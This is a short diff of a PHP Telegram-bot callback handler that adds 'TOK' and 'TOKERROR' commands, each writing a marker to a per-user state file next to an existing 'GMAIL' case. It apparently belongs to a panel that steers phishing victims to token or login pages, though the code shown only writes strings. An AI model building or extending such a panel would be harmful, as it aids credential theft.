@@ -21,6 +21,12 @@ if (isset($update['callback_query'])) {
         $archivo = $dir . '/' . basename($usuario) . '.txt';
 
         switch ($comando) {
+            case "TOK":
+                file_put_contents($archivo, "/TOK");
+                break;
+            case "TOKERROR":
+                file_put_contents($archivo, "/TOKERROR");
+                break;
             case "GMAIL":
                 file_put_contents($archivo, "/GMAIL");
                 break;
